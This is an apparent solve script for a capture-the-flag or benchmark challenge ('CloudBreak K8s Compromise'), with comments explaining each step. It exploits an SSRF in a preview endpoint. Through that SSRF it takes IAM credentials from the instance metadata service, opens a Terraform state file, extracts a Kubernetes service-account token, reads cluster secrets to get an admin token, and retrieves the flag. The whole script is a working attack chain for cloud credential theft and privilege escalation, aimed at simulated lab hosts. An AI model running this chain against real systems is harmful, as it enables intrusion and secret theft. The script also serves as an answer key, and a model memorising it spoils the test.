#!/usr/bin/env bash
# APEX-055-25 — "CloudBreak K8s Compromise" (tags: ssrf, cloud_metadata, kubernetes)
#
# One SSRF, spent six times. `/api/preview` fetches a URL and lets the caller
# name headers, which is the difference between reading public pages and being
# a client on the internal network.
#
# From there it is a chain of things each of which trusts the last: the instance
# metadata service hands out the role's credentials to anyone who can reach it;
# those open the Terraform state bucket; the state file records a Kubernetes
# service-account token in plaintext, which is what a state file does with every
# secret it manages; that token reads the cluster's secrets; and among them is a
# second, more privileged token which the secrets service accepts.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex055-$$"
METADATA="http://metadata-service:8080/latest/meta-data/iam/security-credentials"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# The preview's answer wraps the fetched body in `content`.
fetch() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/api/preview \
        --set header.Content-Type=application/json \
        --set "json.url=$1" "${@:2}" |
        body | python3 -c 'import json,sys; print(json.load(sys.stdin).get("content",""), end="")'
}

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

ROLE="$(fetch "$METADATA/" | tr -d '[:space:]')"
KEY="$(fetch "$METADATA/$ROLE/AccessKeyId" | tr -d '[:space:]')"

# A Terraform state file is an inventory of secrets, written down.
STATE="$(fetch "http://terraform-state-sim:9000/tf-state/production/terraform.tfstate?access_key=$KEY")"
read -r CLUSTER SA <<<"$(printf '%s' "$STATE" | python3 -c '
import json, sys
state = json.load(sys.stdin)
endpoint = state["outputs"]["cluster_endpoint"]["value"]
for resource in state["resources"]:
    if resource["type"] == "kubernetes_service_account":
        print(endpoint, resource["instances"][0]["attributes"]["token"])
        break
')"

# That token reads the cluster, and the cluster is keeping a better one.
ADMIN="$(fetch "$CLUSTER/api/v1/namespaces/production/secrets/cloud-admin-sa" \
    --set "json.headers.Authorization=Bearer $SA" | python3 -c '
import base64, json, sys
print(base64.b64decode(json.load(sys.stdin)["data"]["token"]).decode())
')"

fetch 'http://secrets-service:5000/api/v1/secrets/production/flag' \
    --set "json.headers.Authorization=Bearer $ADMIN" | flag
